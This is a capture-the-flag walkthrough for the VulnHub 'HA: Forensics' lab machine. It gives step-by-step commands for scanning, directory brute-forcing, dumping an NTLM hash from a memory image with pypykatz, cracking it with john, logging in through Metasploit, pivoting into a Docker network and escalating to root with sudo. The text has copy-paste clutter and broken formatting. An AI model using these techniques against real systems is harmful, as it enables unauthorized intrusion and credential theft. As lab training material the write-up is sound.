# HA-Forensics-Vulnhub-
A detailed forensics-focused CTF walkthrough from VulnHub's HA: Forensics machine — involving memory dumps, metadata, password cracking, and privilege escalation

# 🧪 HA: Forensics - CTF Walkthrough (VulnHub)

> A complete forensic-style walkthrough of the VulnHub machine: **HA: Forensics**. This lab includes multiple stages involving image analysis, memory dump forensics, post-exploitation pivoting, and privilege escalation.

---

## 📌 Summary

- **Platform:** VulnHub  
- **Category:** Forensics / Post-Exploitation  
- **Difficulty:** Intermediate  
- **Flags:** 4  
- **IP Address:** `Machine_IP`  
- **Tools Used:** `nmap`, `netdiscover`, `dirb`, `exiftool`, `pypykatz`, `john`, `Metasploit`, `Autopsy`

---

## 🛰️ 1. Network Discovery

```bash
sudo netdiscover -r Machine_IP/24
```


## 🔍 2. Port Scanning with Nmap
```bash
sudo nmap -A -Pn "Machine_IP"

Open ports:

SSH (22)
HTTP (80)
```

## 🌐 3. Web Enumeration

```bash
Visit: http://Machine_ip
The webpage displays some forensic-themed imagery.

Using dirb or dirbuster, we find a hidden /images/ directory.

bash
Copy
Edit
dirb http://Machine-IP/
Inside /images/:

DNA.jpg (decoy)

fingerprint.jpg ➝ contains EXIF metadata

bash
Copy
Edit
exiftool fingerprint.jpg
🎯 Flag #1 Found! Inside EXIF comment
```

## 📁 4. Deeper Enumeration

```bash
Directory brute-force with extensions:

bash
Copy
Edit
dirb http://192.168.101.12/ -X .txt
Discovered: /tips.txt ➝ mentions flag.zip

Download flag.zip and extract:

bash
Copy
Edit
unzip flag.zip
```

## 🎯 Flag #2 Found inside PDF
```bash

🧠 5. Memory Forensics
The ZIP also contains a .dmp file (memory dump).
Analyze with pypykatz:

bash
Copy
Edit
pypykatz lsa minidump file.dmp
Extracted NTLM hash ➝ Save to hashes.txt

Crack with john:

bash
Copy
Edit
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Password found: Password@1
```
🔓 6. Initial Access (SSH + Meterpreter)

```bash
bash
Copy
Edit
use auxiliary/scanner/ssh/ssh_login
set USERNAME jasoos
set PASSWORD Password@1
set RHOSTS 192.168.101.12
run
Got meterpreter session 🎉
Enumerate interfaces:

bash
Copy
Edit
ifconfig
Found Docker bridge: 172.17.0.1

Use autoroute:

bash
Copy
Edit
run autoroute -s 172.17.0.0/24
```
📡 7. Internal Pivot & FTP Access
```bash
Ping sweep to find Docker service:

bash
Copy
Edit
for i in $(seq 2 254); do ping -c1 172.17.0.$i | grep "bytes from"; done
Found: 172.17.0.2

Nmap scan ➝ FTP (21) open
Test anonymous login:

bash
Copy
Edit
ftp 172.17.0.2
Name: anonymous
Password: anonymous
Inside /pub/ ➝ saboot.001
```
🔬 8. Forensic Image Analysis with Autopsy
```bash
Transfer using Python HTTP server:

On target:

bash
Copy
Edit
python3 -m http.server 8000
On host:

bash
Copy
Edit
wget http://172.17.0.2:8000/saboot.001
Start Autopsy:

bash
Copy
Edit
autopsy
Open browser: http://localhost:9999

Create case ➝ Add image ➝ Select as partition
```
🎯 Found:
```bash
flag.txt ➝ Flag #3

creds.txt ➝ Base64-encoded password
```
🧬 9. Privilege Escalation
```bash
Decode creds:

bash
Copy
Edit
echo 'UGFzc3dvcmQyQCM=' | base64 -d
# Output: Password2@#
Use su to switch user ➝ forensics:

bash
Copy
Edit
su forensics
Check sudo rights:

bash
Copy
Edit
sudo -l
Can run ALL as root ➝ escalate:

bash
Copy
Edit
sudo bash
```
🎯 Final flag at /root/final_flag.txt ➝ Flag #4
```bash
🧠 Key Learnings
Always brute-force with multiple file extensions

EXIF metadata is a goldmine in forensics

Pypykatz is incredibly useful with memory dumps

Use autoroute to pivot inside internal networks

Autopsy is a powerful GUI-based image analyzer

Don’t underestimate Base64 encoding for password hiding
